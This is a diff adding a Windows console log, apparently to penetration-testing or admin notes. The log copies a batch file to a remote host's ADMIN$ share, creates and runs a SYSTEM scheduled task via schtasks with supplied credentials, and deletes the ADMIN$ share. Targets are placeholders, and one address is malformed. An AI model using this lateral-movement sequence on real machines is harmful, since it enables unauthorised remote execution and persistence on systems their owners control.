@@ -132,3 +132,25 @@ PS WSMan:\> ls
 ComputerName                                  Type
 ------------                                  ----
 localhost                                     Container
+
+C:\Users\Administrator>copy xxx.bat \\xxx.xxx.xxx.xxx\ADMIN$
+已复制         1 个文件.
+
+C:\Users\Administrator>schtasks /create /s xxx.xxx.xxx.xxx /ru "system" /tn xxx /sc DAILY /tr xxx.bat /F
+成功:成功创建计划任务"xxx".
+C:\Users\Administrator>schtasks /run /s xxx.xxx.xxx.xxx /tn xxx... /i
+成功:尝试运行"xxx".
+C:\Users\Administrator>net share ADMIN$ /del
+用户打开了 ADMIN$ 上的文件.继续这项操作会强制关闭文件.
+
+你想继续此操作吗? (Y/N) [N]: Y
+ADMIN$已经删除.
+C:\Users\Administrator>copy C:\Users\Administrator\xxx.bat \\xxx.xxx.xxx.xxx.xxx\ADMIN$
+覆盖 \\\ADMIN$\xxx.bat 吗? (Yes/No/All): yes
+已复制         1 个文件.
+
+C:\Users\Administrator>schtasks /create /s xxx.xxx.xxx.xxx /ru "system" /tn xxx.bat /sc DAILY /tr xxx... /F /U username /P password
+成功: 成功创建计划任务 "xxx...".
+
+C:\Users\Administrator>schtasks /run /s xxx.xxx.xxx.xxx /tn xxx... /i /U username /P password
+成功: 尝试运行 "xxx...".
